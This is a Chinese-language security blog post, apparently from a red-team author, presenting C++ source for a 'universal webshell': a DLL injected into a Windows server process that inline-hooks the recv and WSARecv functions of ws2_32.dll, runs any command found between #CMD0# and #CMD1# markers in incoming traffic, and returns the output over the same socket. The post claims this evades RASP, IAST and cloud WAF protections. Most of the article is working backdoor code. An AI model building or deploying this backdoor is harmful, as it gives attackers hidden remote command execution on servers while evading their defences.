@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="Jayl1n">
+<meta name="baidu-site-verification" content="elXpeED2jg">
+
+
+
+<meta name="description" content="本文首发 https://xz.aliyun.com/t/9774   标题中的 “通用” 指跨语言，本文的实现是基于 Windows 的，需要 Linux 的可以参考本文的思路，实现起来并没有太大区别。  原理Windows 上程序涉及网络 socket 操作，一般都会用到 winsock2 的库，程序会动态链接 ws2_32.dll ，JVM，Python，Zend 等解释器都不例外。 wi">
+<meta name="keywords" content="开发,Java,RedTeam,红蓝对抗,工具分享">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用 Hook 技术打造通用的 Webshell">
+<meta property="og:url" content="https://jayl1n.github.io/2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/index.html">
+<meta property="og:site_name" content="Jayl1n&#39;s Blog">
+<meta property="og:description" content="本文首发 https://xz.aliyun.com/t/9774   标题中的 “通用” 指跨语言，本文的实现是基于 Windows 的，需要 Linux 的可以参考本文的思路，实现起来并没有太大区别。  原理Windows 上程序涉及网络 socket 操作，一般都会用到 winsock2 的库，程序会动态链接 ws2_32.dll ，JVM，Python，Zend 等解释器都不例外。 wi">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/java.gif">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/python.gif">
+<meta property="og:updated_time" content="2023-08-16T15:16:43.317Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用 Hook 技术打造通用的 Webshell">
+<meta name="twitter:description" content="本文首发 https://xz.aliyun.com/t/9774   标题中的 “通用” 指跨语言，本文的实现是基于 Windows 的，需要 Linux 的可以参考本文的思路，实现起来并没有太大区别。  原理Windows 上程序涉及网络 socket 操作，一般都会用到 winsock2 的库，程序会动态链接 ws2_32.dll ，JVM，Python，Zend 等解释器都不例外。 wi">
+<meta name="twitter:image" content="https://jayl1n.github.io/2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/java.gif">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Jayl1n&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/cat.jpg">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="../../../../css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>利用 Hook 技术打造通用的 Webshell | Jayl1n&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?08bebd32e2a42a1273ff796a43439f77";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/cat.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Jayl1n</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="../../../../index.html">主页</a></li>
+                        
+                            <li><a href="../../../../archives/">所有文章</a></li>
+                        
+                            <li><a href="../../../../tags/">标签云</a></li>
+                        
+                            <li><a href="../../../../about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:panja@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://www.github.com/Jayl1n" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="../../../../atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/BLOG/">BLOG</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/JSP/">JSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pentest/">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RedTeam/">RedTeam</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/i春秋/">i春秋</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/二进制/">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/工具分享/">工具分享</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/心路/">心路</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/日常/">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/浏览器/">浏览器</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/爬虫/">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/红蓝对抗/">红蓝对抗</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://redteam.today">李三的剑谱</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://blog.l0ca1.xyz/">l0cal</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://7o8v.me/">7o8v</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://godot.win/">Godot</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://evoa.me/">evoA</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://abcdefghijklmnopqrst.xyz/">骑麦兜看落日</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://kkdlong.win">kkdlong</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于安全</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Jayl1n</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/cat.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Jayl1n</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="../../../../index.html">主页</a></li>
+                
+                    <li><a href="../../../../archives/">所有文章</a></li>
+                
+                    <li><a href="../../../../tags/">标签云</a></li>
+                
+                    <li><a href="../../../../about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:panja@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://www.github.com/Jayl1n" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="../../../../atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-use-inlinehook-technology-to-make-a-more-general-webshell" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="" class="article-date">
+      <time datetime="2021-07-01T12:08:53.000Z" itemprop="datePublished">2021-07-01</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      利用 Hook 技术打造通用的 Webshell
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/RedTeam/">RedTeam</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/工具分享/">工具分享</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/开发/">开发</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/红蓝对抗/">红蓝对抗</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>本文首发 <a href="https://xz.aliyun.com/t/9774" target="_blank" rel="noopener">https://xz.aliyun.com/t/9774</a></p>
+</blockquote>
+<blockquote>
+<p>标题中的 “通用” 指跨语言，本文的实现是基于 Windows 的，需要 Linux 的可以参考本文的思路，实现起来并没有太大区别。</p>
+</blockquote>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>Windows 上程序涉及网络 socket 操作，一般都会用到 winsock2 的库，程序会动态链接 <code>ws2_32.dll</code> ，JVM，Python，Zend 等解释器都不例外。</p>
+<p>winsock2 里 socket 操作相关的函数 <code>recv</code> <code>send</code> <code>closesocket</code> 会编程的应该都不陌生。<strong>hook 掉 <code>recv</code> 函数就可以在程序处理接受到网络数据前，进入我们的处理逻辑早一步收到数据。</strong></p>
+<p>由于实现是 native 的，所以在成功 hook 的情况下能绕过现代的 RASP、IAST、云WAF 等现代流行的防护技术。</p>
+<h1 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h1><p>Inline Hook 是在程序运行时直接修改指令，插入跳转指令（jmp/call/retn）来控制程序执行流的一种技术。相比别的 Hook 技术，Inline Hook 优点是能跨平台，稳定，本文是以此技术实现的。</p>
+<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>具体实现分为两个部分，一个是hook函数的 DLL(只讲这个)；另一个是向进程注入 DLL 的辅助工具(网上的文章很多，需要的见完整源码)。</p>
+<h2 id="InstallHook"><a href="#InstallHook" class="headerlink" title="InstallHook"></a>InstallHook</h2><p>安装钩子</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> START_BLOCK <span class="meta-string">"#CMD0#"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> END_BLOCK <span class="meta-string">"#CMD1#"</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwInstSize = <span class="number">12</span>;</span><br><span class="line">BYTE RecvEntryPointInst[<span class="number">12</span>] = &#123; <span class="number">0x00</span> &#125;;</span><br><span class="line">BYTE RecvEntryPointInstHook[<span class="number">12</span>] = &#123; <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span> &#125;;</span><br><span class="line">BYTE WSARecvEntryPointInst[<span class="number">12</span>] = &#123; <span class="number">0x00</span> &#125;;</span><br><span class="line">BYTE WSARecvEntryPointInstHook[<span class="number">12</span>] = &#123; <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNRecv )</span><span class="params">( SOCKET, <span class="keyword">char</span>*, <span class="keyword">int</span>, <span class="keyword">int</span> )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNSend )</span><span class="params">( SOCKET, <span class="keyword">char</span>*, <span class="keyword">int</span>, <span class="keyword">int</span> )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNWSARecv )</span> <span class="params">( SOCKET, LPWSABUF, DWORD, LPDWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNWSASend )</span> <span class="params">( SOCKET, LPWSABUF, DWORD, LPDWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstallHook</span><span class="params">(LPCWSTR lpModule, LPCSTR lpFuncName, LPVOID lpFunction)</span> </span>&#123;</span><br><span class="line">	DWORD_PTR FuncAddress = (UINT64) GetProcAddress(GetModuleHandleW(lpModule), lpFuncName);</span><br><span class="line">	DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(VirtualProtect((LPVOID) FuncAddress, dwInstSize, PAGE_EXECUTE_READWRITE, &amp;OldProtect))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"recv"</span>)) &#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(RecvEntryPointInst, (LPVOID) FuncAddress, dwInstSize);</span><br><span class="line">			*(PINT64) ( RecvEntryPointInstHook + <span class="number">2</span> ) = (UINT64) lpFunction;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"WSARecv"</span>)) &#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(WSARecvEntryPointInst, (LPVOID) FuncAddress, dwInstSize);</span><br><span class="line">			*(PINT64) ( WSARecvEntryPointInstHook + <span class="number">2</span> ) = (UINT64) lpFunction;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"recv"</span>)) </span><br><span class="line">		<span class="built_in">memcpy</span>((LPVOID) FuncAddress, &amp;RecvEntryPointInstHook, <span class="keyword">sizeof</span>(RecvEntryPointInstHook));</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName,<span class="string">"WSARecv"</span>))</span><br><span class="line">		<span class="built_in">memcpy</span>((LPVOID) FuncAddress, &amp;WSARecvEntryPointInstHook, <span class="keyword">sizeof</span>(WSARecvEntryPointInstHook));</span><br><span class="line"></span><br><span class="line">	VirtualProtect((LPVOID) FuncAddress, dwInstSize, OldProtect, &amp;OldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="UninstallHook"><a href="#UninstallHook" class="headerlink" title="UninstallHook"></a>UninstallHook</h2><p>卸载钩子</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UninstallHook</span><span class="params">(LPCWSTR lpModule, LPCSTR lpFuncName)</span> </span>&#123;</span><br><span class="line">	UINT64 FuncAddress = (UINT64) GetProcAddress(GetModuleHandleW(lpModule), lpFuncName);</span><br><span class="line">	DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(VirtualProtect((LPVOID) FuncAddress, dwInstSize, PAGE_EXECUTE_READWRITE, &amp;OldProtect))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"recv"</span>)) </span><br><span class="line">			<span class="built_in">memcpy</span>((LPVOID) FuncAddress, RecvEntryPointInst, <span class="keyword">sizeof</span>(RecvEntryPointInst));</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName,<span class="string">"WSARecv"</span>))</span><br><span class="line">			<span class="built_in">memcpy</span>((LPVOID) FuncAddress, WSARecvEntryPointInst, <span class="keyword">sizeof</span>(WSARecvEntryPointInst));</span><br><span class="line">	&#125;</span><br><span class="line">	VirtualProtect((LPVOID) FuncAddress, dwInstSize, OldProtect, &amp;OldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="HookRecv"><a href="#HookRecv" class="headerlink" title="HookRecv"></a>HookRecv</h2><p>hook recv 的函数，程序在执行 recv 时，会先进入这个函数。</p>
+<p>在这个函数里，调用原来的 recv 获取数据，判断是否有<code>START_BLOCK</code>、<code>END_BLOCK</code>块，有的话就取出块之间的命令，执行。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">HookRecv</span><span class="params">(SOCKET s, <span class="keyword">char</span>* buf, <span class="keyword">int</span> len, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line">	UninstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"recv"</span>);</span><br><span class="line"></span><br><span class="line">	PFNRecv pfnRecv = (PFNRecv) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"recv"</span>);</span><br><span class="line">	PFNSend pfnSend = (PFNSend) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"send"</span>);</span><br><span class="line">	PFNClosesocket pfnClosesocket = (PFNClosesocket) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"closesocket"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> rc = pfnRecv(s, buf, len, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span>* startBlock = <span class="built_in">strstr</span>(buf, START_BLOCK);</span><br><span class="line">	<span class="keyword">if</span>(startBlock) &#123;</span><br><span class="line">		<span class="keyword">char</span>* endBlock = <span class="built_in">strstr</span>(startBlock, END_BLOCK);</span><br><span class="line">		<span class="keyword">if</span>(endBlock) &#123;</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">string</span> start_block = <span class="built_in">std</span>::<span class="built_in">string</span>(startBlock);</span><br><span class="line">			<span class="keyword">int</span> endOffset = start_block.find(END_BLOCK, <span class="keyword">sizeof</span>(START_BLOCK));</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">string</span> cmd = start_block.substr(<span class="keyword">sizeof</span>(START_BLOCK) - <span class="number">1</span>, start_block.size() - <span class="keyword">sizeof</span>(START_BLOCK) - ( start_block.size() - endOffset ) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">string</span> output = WSTR2STR(ExecuteCmd(cmd));</span><br><span class="line"></span><br><span class="line">			pfnSend(s, (<span class="keyword">char</span>*) output.c_str(), output.size(), <span class="number">0</span>);</span><br><span class="line">         pfnClosesocket(s);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"recv"</span>, (LPVOID) HookRecv);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>  rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">HookWSARecv</span><span class="params">(SOCKET s, LPWSABUF lpBuffer, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	UninstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"WSARecv"</span>);</span><br><span class="line"></span><br><span class="line">	PFNWSARecv pfnWSARecv = (PFNWSARecv) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"WSARecv"</span>);</span><br><span class="line">	PFNWSASend pfnWSASend = (PFNWSASend) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"WSASend"</span>);</span><br><span class="line">	PFNClosesocket pfnClosesocket = (PFNClosesocket) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"closesocket"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> rc = pfnWSARecv(s, lpBuffer, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span>* startBlock = <span class="built_in">strstr</span>(lpBuffer-&gt;buf, START_BLOCK);</span><br><span class="line">	<span class="keyword">if</span>(startBlock) &#123;</span><br><span class="line">		<span class="keyword">char</span>* endBlock = <span class="built_in">strstr</span>(startBlock, END_BLOCK);</span><br><span class="line">		<span class="keyword">if</span>(endBlock) &#123;</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">string</span> start_block = <span class="built_in">std</span>::<span class="built_in">string</span>(startBlock);</span><br><span class="line">			<span class="keyword">int</span> endOffset = start_block.find(END_BLOCK, <span class="keyword">sizeof</span>(START_BLOCK));</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">string</span> cmd = start_block.substr(<span class="keyword">sizeof</span>(START_BLOCK) - <span class="number">1</span>, start_block.size() - <span class="keyword">sizeof</span>(START_BLOCK) - ( start_block.size() - endOffset ) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">			WSABUF outBuf;</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">string</span> output = WSTR2STR(ExecuteCmd(cmd));</span><br><span class="line">			outBuf.buf = (<span class="keyword">char</span>*) output.c_str();</span><br><span class="line">			outBuf.len = output.size();</span><br><span class="line"></span><br><span class="line">			pfnWSASend(s, &amp;outBuf, <span class="number">1</span>, lpNumberOfBytesRecvd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">         pfnClosesocket(s);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"WSARecv"</span>, (LPVOID) HookWSARecv);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>  rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里还 hook 了 <code>WSARecv</code> ，是因为我在 Tomcat 上测试遇到个问题  hook <code>recv</code> 后收到的数据是乱码，长度也对不上。 后来想到 Tomcat 现在默认是 NIO 处理，JVM 的用的 API 可能不一样，翻看了一下源码，发现 Windows 上 NIO 相关的 socket 操作函数实际用的是 <code>WSARecv</code>、<code>WSASend</code> 等带 <code>WSA</code> 前缀的，加了 hook 点之后能正常读到数据了。</p>
+</blockquote>
+<h2 id="DllMain"><a href="#DllMain" class="headerlink" title="DllMain"></a>DllMain</h2><p>DLL 入口，调用安装钩子</p>
